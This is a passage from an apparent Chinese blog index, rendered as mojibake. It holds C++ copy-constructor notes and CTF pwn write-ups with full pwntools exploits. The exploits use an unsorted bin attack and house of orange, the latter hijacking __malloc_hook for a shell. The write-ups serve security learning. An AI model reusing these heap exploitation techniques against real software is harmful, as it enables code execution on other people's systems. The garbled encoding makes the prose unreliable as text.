å‡½æ•°éƒ½æ²¡å†™ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨æä¾›é»˜è®¤æ„é€ å’Œæ‹·è´æ„é€  //è¦æ˜¯å†™äº†æœ‰å‚æ„é€ ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨é»˜è®¤æä¾›æ‹·è´æ„é€  //è¦æ˜¯å†™äº†æ‹·è´æ„é€ ï¼Œç¼–è¯‘å™¨å•¥éƒ½ä¸æä¾› class Person { public: int m_age; int *m_height; //èº«é«˜ï¼Œç”¨æŒ‡é’ˆæ¥åš é‡ç‚¹å…³æ³¨è¿™ä¸ªå€¼ Person() { cout &lt;&lt; &quot;Personçš„é»˜è®¤æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } Person(int age,int height) { m_age = age; m_height = new int(height); cout &lt;&lt; &quot;Personçš„æœ‰å‚æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } ~Person() { if (m_height != NULL) { delete m_height; //å¦‚æœåˆ©ç”¨ç¼–è¯‘å™¨æä¾›çš„æ‹·è´æ„é€ å‡½æ•°ï¼Œä¼šåšæµ…æ‹·è´æ“ä½œ //æµ…æ‹·è´å¸¦æ¥çš„é—®é¢˜ï¼šå †åŒºçš„å†…å­˜é‡å¤é‡Šæ”¾ //å¦‚ä½•è§£å†³ï¼Ÿï¼Ÿï¼Ÿ ç”¨æ·±æ‹·è´æ¥åšï¼Œè‡ªå·±å†™ä¸€ä¸ªæ‹·è´æ„é€ å‡½æ•° m_height = NULL; //double free!!!! } cout &lt;&lt; &quot;Personçš„ææ„å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } }; void test1() { Person p1(3,140); cout &lt;&lt; &quot;p1çš„å¹´é¾„ä¸º&quot; &lt;&lt; p1.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p1çš„èº«é«˜ä¸º&quot; &lt;&lt; *p1.m_height &lt;&lt; endl; Person p2(p1); cout &lt;&lt; &quot;p2çš„å¹´é¾„ä¸º&quot; &lt;&lt; p2.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p2çš„èº«é«˜ä¸º&quot; &lt;&lt; *p2.m_height &lt;&lt; endl; } int main(int argc, char const *argv[]) { test1(); return 0; } è§£å†³é—®é¢˜ï¼šæ·±æ‹·è´ #include &lt;iostream&gt; using namespace std; //å‰ç½®çŸ¥è¯†ï¼šå½“ä¸€ä¸ªç±»åˆå§‹åŒ–çš„æ—¶å€™ï¼Œå•¥æ„é€ å‡½æ•°éƒ½æ²¡å†™ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨æä¾›é»˜è®¤æ„é€ å’Œæ‹·è´æ„é€  //è¦æ˜¯å†™äº†æœ‰å‚æ„é€ ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨é»˜è®¤æä¾›æ‹·è´æ„é€  //è¦æ˜¯å†™äº†æ‹·è´æ„é€ ï¼Œç¼–è¯‘å™¨å•¥éƒ½ä¸æä¾› class Person { public: int m_age; int *m_height; //èº«é«˜ï¼Œç”¨æŒ‡é’ˆæ¥åš é‡ç‚¹å…³æ³¨è¿™ä¸ªå€¼ Person() { cout &lt;&lt; &quot;Personçš„é»˜è®¤æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } Person(int age,int height) { m_age = age; m_height = new int(height); cout &lt;&lt; &quot;Personçš„æœ‰å‚æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } //ç°åœ¨æˆ‘ä»¬æ¥å†™ä¸€ä¸ªæ‹·è´æ„é€ å‡½æ•°æ¥è§£å†³æµ…æ‹·è´é—®é¢˜ Person(const Person &amp;p) { m_age = p.m_age; //m_height = p.m_height &lt;---- è¿™è¡Œä»£ç æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨æä¾›çš„ä»£ç ï¼Œä¼šå¼•èµ·æµ…æ‹·è´çš„é—®é¢˜ //æ·±æ‹·è´æ“ä½œï¼šé‡æ–°åœ¨å †åŒºå¼€è¾Ÿä¸€å—ç©ºé—´ï¼ m_height = new int(*p.m_height); cout &lt;&lt; &quot;Personçš„æ‹·è´æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } ~Person() { if (m_height != NULL) { delete m_height; //å¦‚æœåˆ©ç”¨ç¼–è¯‘å™¨æä¾›çš„æ‹·è´æ„é€ å‡½æ•°ï¼Œä¼šåšæµ…æ‹·è´æ“ä½œ //æµ…æ‹·è´å¸¦æ¥çš„é—®é¢˜ï¼šå †åŒºçš„å†…å­˜é‡å¤é‡Šæ”¾ //å¦‚ä½•è§£å†³ï¼Ÿï¼Ÿï¼Ÿ ç”¨æ·±æ‹·è´æ¥åšï¼Œè‡ªå·±å†™ä¸€ä¸ªæ‹·è´æ„é€ å‡½æ•° m_height = NULL; //double free!!!! } cout &lt;&lt; &quot;Personçš„ææ„å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } }; void test1() { Person p1(3,140); cout &lt;&lt; &quot;p1çš„å¹´é¾„ä¸º&quot; &lt;&lt; p1.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p1çš„èº«é«˜ä¸º&quot; &lt;&lt; *p1.m_height &lt;&lt; endl; Person p2(p1); cout &lt;&lt; &quot;p2çš„å¹´é¾„ä¸º&quot; &lt;&lt; p2.m_age &lt;&lt; endl; cout &lt;&lt; &quot;p2çš„èº«é«˜ä¸º&quot; &lt;&lt; *p2.m_height &lt;&lt; endl; } int main(int argc, char const *argv[]) { test1(); return 0; } åˆå§‹åŒ–åˆ—è¡¨ #include &lt;iostream&gt; using namespace std; //ä½œç”¨ï¼šc++æä¾›äº†åˆå§‹åŒ–åˆ—è¡¨è¯­æ³•ï¼Œç”¨æ¥åˆå§‹åŒ–å±æ€§ class Person { public: int m_a,m_b,m_c; public: /* ä¼ ç»Ÿåˆå§‹åŒ–æ“ä½œ Person(int a,int b,int c) { m_a = a; m_b = b; m_c = c; } */ //åˆå§‹åŒ–åˆ—è¡¨è¯­æ³•ï¼ Person(int a,int b,int c):m_a(a),m_b(b),m_c(c) { } }; void test() { Person p1 = Person(10,20,30); cout &lt;&lt; &quot;p1çš„å€¼ä¸ºï¼š&quot; &lt;&lt; p1.m_a &lt;&lt; ',' &lt;&lt; p1.m_b &lt;&lt; ',' &lt;&lt; p1.m_c &lt;&lt; endl; } int main(int argc, char const *argv[]) { test(); return 0; } ç±»å’Œå¯¹è±¡ ç±»å¯¹è±¡ä½œä¸ºç±»æˆå‘˜ Bç±»ä¸­æœ‰å¯¹è±¡Aä½œä¸ºæˆå‘˜ï¼ŒAå°±æ˜¯å¯¹è±¡æˆå‘˜ é‡ç‚¹ï¼šè§‚å¯ŸäºŒè€…çš„æ„é€ å’Œææ„çš„è°ƒç”¨é¡ºåº #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; class Phone { public: string mpname; Phone(string pname) { mpname = pname; cout &lt;&lt; &quot;Phoneæ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } ~Phone() { cout &lt;&lt; &quot;Phoneçš„ææ„å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } }; class Person { public: string mname; Phone mphone; //æœ¬è´¨ï¼š Phone mphone = phone; éšå¼è½¬æ¢æ³•ï¼ï¼ï¼ Person(string name,string phone):mname(name),mphone(phone) { cout &lt;&lt; &quot;Personæ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } ~Person() { cout &lt;&lt; &quot;Personçš„ææ„å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl; } }; void test() { Person p1(&quot;tom&quot;,&quot;huawei&quot;); cout &lt;&lt; &quot;p1çš„å€¼ä¸ºï¼š&quot; &lt;&lt; p1.mname &lt;&lt; endl; cout &lt;&lt; p1.mphone.mpname &lt;&lt; endl; } int main() { test(); return 0; } ","link":"https://l3mon629.github.io/post/cxue-xi/"},{"title":"unsorted bin attack","content":"ç®€å•è¯´æ˜ åŸºæœ¬æ¥æº å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚ é‡Šæ”¾ä¸€ä¸ªä¸å±äº fast bin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk ä¼šè¢«é¦–å…ˆæ”¾åˆ° unsorted bin ä¸­ã€‚ å½“è¿›è¡Œ malloc_consolidate æ—¶ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„ chunk æ”¾åˆ° unsorted bin ä¸­ï¼Œå¦‚æœä¸æ˜¯å’Œ top chunk è¿‘é‚»çš„è¯ã€‚ åˆ©ç”¨æ–¹æ³•ï¼š æ”¹unsorted bin çš„bkä¸ºtarget-0x10 å®ç°æ•ˆæœï¼š å°†targetæ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å€¼ åˆ©ç”¨åœºæ™¯ï¼š ä¿®æ”¹å¾ªç¯çš„æ¬¡æ•°æ¥ä½¿å¾—ç¨‹åºå¯ä»¥æ‰§è¡Œå¤šæ¬¡å¾ªç¯ã€‚ ä¿®æ”¹ heap ä¸­çš„ global_max_fast æ¥ä½¿å¾—æ›´å¤§çš„ chunk å¯ä»¥è¢«è§†ä¸º fast binã€‚ æ”¹_IO_list_allæ¥ä¼ªé€ _IO_FILEè¿›è¡Œæ”»å‡»ã€‚ hitcontraining_lab14 é¢˜ç›®çš„editåŠŸèƒ½å¯ä»¥æ”¹sizeï¼Œå®ç°ä¸€ä¸ªå¼ºåŠ›çš„å †æº¢å‡ºï¼ŒåŒæ—¶é¢˜ç›®å­˜åœ¨åé—¨ï¼Œåªè¦æ”¹ä¸€ä¸ªbssæ®µçš„å˜é‡å¤§äºå³å¯cat flag æ€è·¯å¾ˆç®€å•ï¼Œå †æº¢å‡ºæ‰“æ‰unsorted binçš„bkï¼Œè¿libcéƒ½ä¸ç”¨æ³„æ¼ exp: from pwn import * p = process('./magicheap') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap :',content) def delete(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) add(0x10,'aaaa') add(0x90,'aaaa') add(0x10,'protect') context.log_level = 'debug' target = 0x6020C0 delete(1) payload = p64(0) * 3 + p64(0xa1) + p64(0) + p64(target-0x10) edit(0,0x40,payload) add(0x90,'a') p.recv() p.send('4869') p.interactive() ","link":"https://l3mon629.github.io/post/unsorted-bin-attack/"},{"title":"house of orangeå­¦ä¹ ","content":"house of orange ä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿ å½“ç¨‹åºä¸æä¾›freeåŠŸèƒ½çš„æ—¶å€™æˆ‘ä»¬é€‰æ‹©é‡‡ç”¨house of orangeæ”»å‡»æ‰‹æ³• ä½œç”¨ï¼šç»è¿‡æ”»å‡»åå¾—åˆ°ä¸€ä¸ªunsorted bin ä»”ç»†å›æƒ³ä¸€ä¸‹è‡ªå·±æ‰€å­¦ï¼Œåœ¨stackä¸­ï¼Œå¤§éƒ¨åˆ†æ”»å‡»æ‰‹æ³•éƒ½ç±»ä¼¼äºæ ˆæº¢å‡ºï¼Œç›®çš„æ˜¯ä¸ºäº†æ§åˆ¶retçš„è¿”å›åœ°å€ åœ¨heapä¸­çš„æ”»å‡»æ‰‹æ³•å¤šæ ·ï¼Œä¸ä»…æœ‰æº¢å‡ºè¿˜æœ‰å¾ˆå¤šæ”»å‡»æ‰‹æ³•ï¼Œä½†æ˜¯å¤§å¤šæ•°ç›®çš„åªæœ‰ä¸€ä¸ªï¼šæ§åˆ¶æŒ‡é’ˆã€‚è€Œfreeæ€çš„å †å—å¤©ç„¶çš„ç»™æˆ‘ä»¬æä¾›äº†ä¸€äº›æŒ‡é’ˆï¼Œfastbinçš„fdï¼Œunsorted binçš„fdå’Œbkç­‰ç­‰ç­‰ç­‰ã€‚é€šè¿‡æ§åˆ¶æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥æ³„æ¼å†…å­˜ï¼Œå¯ä»¥æ”¹å†™å†…å­˜ï¼Œç›¸å½“äºæ§åˆ¶äº†ç¨‹åºçš„æ‰§è¡Œæµã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹çš„è¯¦ç»†æƒ…å†µï¼Œæˆ‘ä»¬å‡è®¾ç›®å‰çš„ top chunk å·²ç»ä¸æ»¡è¶³ malloc çš„åˆ†é…éœ€æ±‚ã€‚ é¦–å…ˆæˆ‘ä»¬åœ¨ç¨‹åºä¸­çš„mallocè°ƒç”¨ä¼šæ‰§è¡Œåˆ° libc.so çš„_int_mallocå‡½æ•°ä¸­ï¼Œåœ¨_int_mallocå‡½æ•°ä¸­ï¼Œä¼šä¾æ¬¡æ£€éªŒ fastbinã€small binsã€unsorted binã€large bins æ˜¯å¦å¯ä»¥æ»¡è¶³åˆ†é…è¦æ±‚ï¼Œå› ä¸ºå°ºå¯¸é—®é¢˜è¿™äº›éƒ½ä¸ç¬¦åˆã€‚æ¥ä¸‹æ¥_int_mallocå‡½æ•°ä¼šè¯•å›¾ä½¿ç”¨ top chunkï¼Œåœ¨è¿™é‡Œ top chunk ä¹Ÿä¸èƒ½æ»¡è¶³åˆ†é…çš„è¦æ±‚ï¼Œæ­¤æ—¶ ptmalloc å·²ç»ä¸èƒ½æ»¡è¶³ç”¨æˆ·ç”³è¯·å †å†…å­˜çš„æ“ä½œï¼Œéœ€è¦æ‰§è¡Œ sysmalloc æ¥å‘ç³»ç»Ÿç”³è¯·æ›´å¤šçš„ç©ºé—´ã€‚ ä½†æ˜¯å¯¹äºå †æ¥è¯´æœ‰ mmap å’Œ brk ä¸¤ç§åˆ†é…æ–¹å¼ï¼Œæˆ‘ä»¬éœ€è¦è®©å †ä»¥ brk çš„å½¢å¼æ‹“å±•ï¼Œä¹‹ååŸæœ‰çš„ top chunk ä¼šè¢«ç½®äº unsorted bin ä¸­ã€‚ è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªunsorted bin ä¸è¿‡ï¼Œæˆ‘ä»¬å¾—æ»¡è¶³ä¸€äº›è¦æ±‚ï¼š 1ï¼Œä¼ªé€ çš„ size å¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µ 2ï¼Œsize è¦å¤§äº MINSIZE(0x10) 3ï¼Œsize è¦å°äºä¹‹åç”³è¯·çš„ chunk size + MINSIZE(0x10) 4ï¼Œsize çš„ prev inuse ä½å¿…é¡»ä¸º 1 BookWriter é€†å‘åˆ†æ mainå‡½æ•° read_authorå‡½æ•° addå‡½æ•°ï¼Œè¯·è®°ä½è¿™ä¸ªcountåœ¨è¿™é‡Œ&gt;8 showå‡½æ•°ï¼Œåˆ°äº†è¿™é‡Œï¼Œå˜æˆæ•°é‡&gt;7äº† editå‡½æ•°ï¼Œå¾ˆè¯¡å¼‚çš„å‘ç°æœ‰ä¸ªstrlenï¼Œå­˜åœ¨æ— 00æˆªæ–­æ¼æ´ï¼Œå¹¶ä¸”å †å—æ•°é‡&gt;7 edit authorå‡½æ•°ï¼ŒåŒæ ·ï¼Œæ¡†èµ·æ¥çš„åœ°æ–¹ä¹Ÿå­˜åœ¨æ— 00æˆªæ–­æ¼æ´ bssæ®µä¸Šï¼Œå‘ç°author,heaparray,sizearrayæ˜¯è¿åœ¨ä¸€èµ·çš„ æ€è·¯ æ€»ç»“ä¸€ä¸‹å‘ç°çš„æ¼æ´ç‚¹ï¼š 1ï¼Œstrlenå’Œprintf(&quot;%s&quot;)çš„æ— 00æˆªæ–­çš„æ¼æ´ 2ï¼Œaddå‡½æ•°å’Œshowï¼Œeditå‡½æ•°ä¸­çš„å…³äºå †å—æ•°é‡çš„é€»è¾‘æ¼æ´ è¿™ä¸¤ä¸ªæ¼æ´å¯ä»¥åšåˆ°ä»€ä¹ˆå‘¢ï¼Ÿ é¦–å…ˆï¼šç¬¬ä¸€ä¸ªstrlenï¼Œå¦‚æœæˆ‘ä»¬ç”³è¯·0x18çš„å †å—ï¼Œå¹¶ä¸”å¡«æ»¡æ‰€æœ‰å†…å®¹ï¼Œé‚£ä¹ˆä¸‹é¢çš„å†…å­˜å¸ƒå±€ä¸æ˜¯\\x00ï¼Œè€Œæ˜¯ä¸‹ä¸€ä¸ªå †å—çš„sizeï¼Œç”±äºä¸ä¸ºç©ºï¼Œä¸‹é¢çš„è¿™ä¸€æ¡è¯­å¥ï¼Œä½¿å¾—æˆ‘ä»¬çš„size_arrayçš„æŸä¸€ä¸ªå…ƒç´ æ‰©å¤§ï¼Œå¯ä»¥å®ç°å°‘é‡å­—èŠ‚çš„å †æº¢å‡º size_array[v1] = strlen(heap_array[v1]); ç¬¬äºŒï¼šprintf(&quot;%s&quot;)æ— 00æˆªæ–­ï¼Œç”±äºauthorå°±åœ¨heaparrayçš„ä¸Šæ–¹ï¼Œæˆ‘ä»¬åŒæ ·çš„å¡«æ»¡authorä¸­çš„å†…å®¹ï¼Œå¯ä»¥æ³„æ¼å‡ºç¬¬ä¸€ä¸ªå †å—å³heaparray[0]çš„åœ°å€ ç¬¬ä¸‰ï¼šç”±äºaddå‡½æ•°ä¸­å­˜åœ¨countå¯ä»¥å¤šç”³è¯·ä¸€ä¸ªï¼Œå³åœ¨addå‡½æ•°é‡Œé¢æˆ‘ä»¬å¯ä»¥ç”³è¯·0-8å…±ä¹ä¸ªå †å—ï¼Œä½†æ˜¯heaparrayçš„å¤§å°æ˜¯8ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç¬¬ä¹ä¸ªå †å—çš„åœ°å€ä¼šè¢«è®°å½•åœ¨sizearrayé‡Œé¢ï¼Œé€ æˆäº†ä¸€ä¸ªå¨åŠ›æå¤§çš„å †æº¢å‡º æ€»æ€è·¯ï¼šåˆ©ç”¨house of orangeå¾—åˆ°ä¸€ä¸ªunsorted binï¼Œç”±äºedit authorçš„å­˜åœ¨ä½¿bssæ®µå¯å†™ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨bssæ®µä¸Šä¼ªé€ ä¸€ä¸ªsizeèƒ½å¤Ÿè¦†ç›–heaparrayçš„unsorted binï¼Œç„¶åç”³è¯·è¿‡æ¥ï¼Œä¾¿å¯ä»¥æ§åˆ¶heaparrayï¼Œç„¶åæ‰“__malloc_hook åˆ©ç”¨æ¼æ´ä¸€ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å†™topchunkçš„sizeï¼Œç„¶åç”³è¯·ä¸€ä¸ªæ¯”topchunkå¤§çš„å †å—ï¼Œå®ç°house of orangeï¼Œå¾—åˆ°ä¸€ä¸ªunsorted binï¼Œç„¶åç”³è¯·ä¸€ä¸ªå°chunkï¼Œç”±äºæ˜¯ä»unsorted biné‡Œé¢åˆ‡ä¸‹æ¥çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥showè¿™ä¸ªå°chunkæ¥æ³„æ¼libcåŸºå€ åˆ©ç”¨æ¼æ´ä¸‰ï¼Œæˆ‘ä»¬ç”³è¯·ä¹æ¬¡chunkï¼Œå¯ä»¥è·å¾—ä¸€ä¸ªè¶…å¤§æº¢å‡ºçš„èƒ½åŠ›ï¼Œæº¢å‡ºåˆ°unsorted binï¼ˆåŸå…ˆçš„top chunkï¼‰ï¼Œç„¶åæ”¹å†™fdå’Œbkï¼Œä½¿å¾—çœŸunsorted binä½äºé˜Ÿåˆ—çš„å‰ä¸€ä¸ªä½ç½® åˆ©ç”¨ç¼–è¾‘ä½œè€…å’Œæ¼æ´äºŒçš„åŠŸèƒ½ï¼Œåœ¨bssæ®µä¼ªé€ ä¸€ä¸ªunsorted binï¼ŒåŒæ—¶è®¾ç½®å¥½fdå’Œbkã€‚å€ŸåŠ©æ¼æ´äºŒå¯ä»¥æ³„æ¼heap[0]çš„åŸºåœ°å€ï¼Œå¯ä»¥è¾…åŠ©æ¥è®¾ç½®fdå’Œbk(å½“ç„¶ï¼Œè®¾ç½®æˆmain_arena+88ä¹Ÿå¯ä»¥ï¼Œåªè¦è®¾ç½®heapæ®µçš„é‚£ä¸ªunsorted biné‡Œé¢çš„bkä¸ºä¼ªé€ çš„unsorted binå³å¯) å†æ¬¡åˆ©ç”¨æ¼æ´ä¸€ï¼Œä¸ºäº†èƒ½å¤Ÿå†æ¬¡ç”³è¯·chunkï¼Œæˆ‘ä»¬åˆ©ç”¨ç¼–è¾‘åŠŸèƒ½ï¼Œç¼–è¾‘0å·chunkï¼Œçš„ç¬¬ä¸€ä¸ªå†…å®¹ä¸º\\x00ï¼Œè¿™æ ·å¯ä»¥æ¬ºéª—strlenï¼Œå°†sizearray[0]å³heaparray[8]è®¾ç½®ä¸º0ï¼Œæˆ‘ä»¬è·å¾—æ— é™ç”³è¯·å †å—çš„èƒ½åŠ› ç”³è¯·åˆé€‚å¤§å°çš„å †å—ï¼Œä½¿å¾—fake unsorted binè„±é“¾ï¼Œä½¿æˆ‘ä»¬è·å¾—åœ¨bssæ®µä¸Šå†™å…¥çš„èƒ½åŠ›ã€‚ å†™å…¥payloadï¼Œæ§åˆ¶heaparrayï¼Œæ”»å‡»__malloc_hookä¸ºsystemåœ°å€ exp from pwn import * local = 1 if local == 1: p = process('./bookwriter') else: p = remote('chall.pwnable.tw',10304) elf = ELF('./bookwriter') libc = ELF('./libc-2.23.so') def dbg(): context.log_level = 'debug' def author(name): p.sendafter('Author :',name) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of page :',str(size)) p.sendafter('Content :',content) def show(index): p.sendlineafter('Your choice :','2') p.sendlineafter('Index of page :',str(index)) def edit(index,content): p.sendlineafter('Your choice :','3') p.sendlineafter('Index of page :',str(index)) #p.sendafter('Content :',content) p.recvuntil('Content:') p.send(content) def edit_author(main_arena_88): p.sendlineafter('Your choice :','4') p.recvuntil('Author :') p.recvuntil(b'A' * 64) leak_heap = u64(p.recvuntil('\\x0a',drop = True)[-4:].ljust(8,b'\\x00')) p.sendlineafter('Do you want to change the author ? (yes:1 / no:0)','1') payload = b'/bin/sh\\x00'+p64(0x111)+p64(leak_heap+0x130)+p64(main_arena_88)+p64(0)*4 p.sendafter('Author :',payload) return leak_heap print(&quot;============ bss ============ &quot;) print(&quot;[*] the 'author' is in 0x602060 &quot;) print(&quot;[*] heaparray[] is in 0x6020A0&quot;) print(&quot;[*] sizearray[] is in 0x6020E0&quot;) print(&quot;============ bss ============ &quot;) author(b'A' * 64) add(0x18,b'A' * 0x18) #0 print(&quot;now we still don't use the fun 'edit',so we dont't use strlen&quot;) print(&quot;the next,we use strlen&quot;) #dbg() print(&quot;========= step 1: make top chunk into unsorted bin ============ &quot;) edit(0,b'A' * 0x18) print(&quot;Now, we successfully have haven 3 bytes to overflow&quot;) #dbg() payload = b'\\x00' * 0x18 + b'\\xe1\\x0f\\x00' edit(0,payload) context.log_level = 'info' add(0x1fe1,'A') #1 print(&quot;======== step 2: leak libc address and the heap address =========== &quot;) add(0x10,'A') #2 show(2) #main_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 1569 #print('main_arena leak ---&gt; ' + hex(main_arena)) #p.recv() libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 0x39c141 #- 88 - 0x10 - libc.sym['__malloc_hook'] print('[*] libc_base ----&gt; ',hex(libc_base)) for i in range(6): add(0x10,'A') main_arena_88 = libc_base + 0x39bb78 print(&quot;forge unsorted bin in author(bss) to control the heaparray &quot;) heap_addr = edit_author(main_arena_88) print('[*] the heaparray[0] ------&gt; ',hex(heap_addr)) print(&quot;=========== step 3: control the heaparray ============ &quot;) print(&quot;to emptify the heaparray[8] (sizearray[0]) ,so we can continue to malloc &quot;) edit(0,p64(0)) #dbg() add(0x30,'AAAAAAAA') author_fake_unsorted_bin = 0x602060 payload = 0x130 * b'\\x00' + p64(0) + p64(0x21) + p64(main_arena_88) + p64(author_fake_unsorted_bin) edit(0,payload) __malloc_hook = main_arena_88 - 88 -0x10 system_addr = libc_base + 0x3f550 add(0x100,48*b'a' + p64(__malloc_hook - 8)) edit(0,p64(0) + p64(system_addr)) p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of page :') p.sendline(str(author_fake_unsorted_bin)) p.interactive() æ”¶è·å‡ ä¸ªç‚¹ï¼š 1ï¼Œä¸€ä¸ªchunkæ”¾å…¥unsorted biné“¾æ—¶å°†è¯¥å †å—æ’å…¥é“¾è¡¨å¤´ï¼Œè€Œä»è¿™ä¸ªé“¾å–å †å—çš„æ—¶å€™æ˜¯ä»å°¾éƒ¨å¼€å§‹çš„ï¼Œå› æ­¤unsorted binéå†å †å—çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯bkæŒ‡é’ˆã€‚ 2ï¼Œmallocè¿‡ç¨‹å¤ä¹  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { void *p,*q; p = malloc(0x1000); malloc(0x10); q = malloc(0x800); malloc(0x20); free(p); free(q); malloc(0x500); malloc(0x500); } è¿‡ç¨‹åˆ†æï¼šæ‰§è¡Œå®Œfreeåpå’Œqéƒ½åœ¨unsorted biné‡Œï¼Œpæ˜¯å¤´éƒ¨ï¼Œqæ˜¯å°¾éƒ¨ã€‚ malloc(0x500)æ—¶ï¼Œunsorted binä»qå¼€å§‹éå†ï¼Œå°†qå’Œpæ”¾åˆ°large binsé‡Œï¼Œç„¶åä»large binsé‡Œåˆ‡å‰²qï¼Œå°†å‰©ä¸‹çš„éƒ¨åˆ†å†æ¬¡é“¾å…¥unsorted binã€‚æ­¤æ—¶påœ¨large binsï¼Œqåœ¨unsorted binã€‚ å†æ¬¡malloc(0x500)æ—¶ï¼Œunsorted binå¼€å§‹éå†ï¼Œqä¸æ»¡è¶³è¦æ±‚ï¼Œè¢«æ”¾å…¥small binsï¼Œpæ»¡è¶³ï¼Œåˆ‡å‰²åè¢«æ”¾å…¥unsorted biné‡Œï¼Œæ‰€ä»¥æœ€ç»ˆç»“æœæ˜¯påœ¨unsorted binï¼Œqåœ¨small binsé‡Œã€‚ 3ï¼Œå…³äºé¢˜ç›®çš„ä¸€äº›tipsï¼Œä¸æ³„æ¼å †åœ°å€ä¹Ÿå¯ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦å°†real unsorted binçš„bkæ”¹ä¸ºfake unsorted binçš„åœ°å€å°±å¯ä»¥äº†ã€‚ å…³äº__malloc_hookï¼Œå…¶å®ä¸€å¼€å§‹ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆ__malloc_hookå¯ä»¥æ”¹ä¸ºsystemæ‹¿shellï¼Œç¿»äº†ä¸€ä¸‹æºç å‘ç°__malloc_hookå…¶å®æ˜¯æœ‰å‚æ•°çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯sizeï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡é’ˆã€‚ä½†æ˜¯å¹¶æ²¡æœ‰å®¡åˆ°ä»€ä¹ˆæ—¶å€™è°ƒç”¨è¿™ä¸¤ä¸ªå‚æ•°ï¼Œåœ¨expä¸­ï¼Œæˆ‘ä»¬æœ€ååˆ©ç”¨__malloc_hook(address)ï¼Œ__malloc_hookçš„åœ°å€è¢«æ”¹æˆäº†systemï¼ŒaddressæŒ‡å‘çš„å†…å®¹æ˜¯/bin/shï¼Œå…·ä½“mallocçš„æ—¶å€™ï¼Œaddressæ˜¯ä½œä¸ºsizeä¼ è¿›å»çš„ã€‚ä¸ªäººçŒœæµ‹è¿™ä¸ªæ–¹æ³•ä¸å¸¸è§çš„åŸå› å¤§æ¦‚æ˜¯å¤§å¤šæ•°çš„é¢˜ç›®å¯¹mallocçš„sizeæ˜¯æœ‰ç•Œé™çš„ï¼Œä¸å…è®¸mallocå¤§size(addressä¸€èˆ¬éƒ½æ˜¯éå¸¸å¤§çš„å€¼) å‚è€ƒé“¾æ¥ï¼š æ·±å…¥ç†è§£unsorted bin attackï¼šhttps://xz.aliyun.com/t/7251 glibcæºç ï¼šhttps://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3034 ctf-wikiï¼šhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/ ","link":"https://l3mon629.github.io/post/house-of-orange-xue-xi/"},{"title":"æ“ä½œç³»ç»Ÿ","content":" !!!æœ¬æ–‡æš‚æ—¶åœæ›´ï¼Œç­‰å­¦ä¹ å®Œæ™®é€šçš„æ“ä½œç³»ç»Ÿå†æ¥æ­¤è¯¾ç¨‹è¿›é˜¶å­¦ä¹  è¯´æ˜ï¼šæœ¬è¯¾ç¨‹ä¸ºå“ˆå°”æ»¨å·¥ä¸šå¤§å­¦ææ²»å†›è€å¸ˆæ‰€å¼€å…¬å¼€è¯¾ï¼Œæœ¬æ–‡ä»…ä½œç¬”è®°ï¼Œä¾›å¤ä¹ å­¦ä¹ ä½¿ç”¨ ä»£ç éƒ¨åˆ†é‡‡ç”¨Linux 0.11éƒ¨åˆ†å†…æ ¸ä»£ç ï¼Œå®éªŒéƒ¨åˆ†é‡‡ç”¨å®éªŒæ¥¼çš„å®éªŒ æ­å¼€é’¢ç´çš„ç›–å­ åˆå§‹åŒ– æ‰“å¼€ç”µæºåå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ 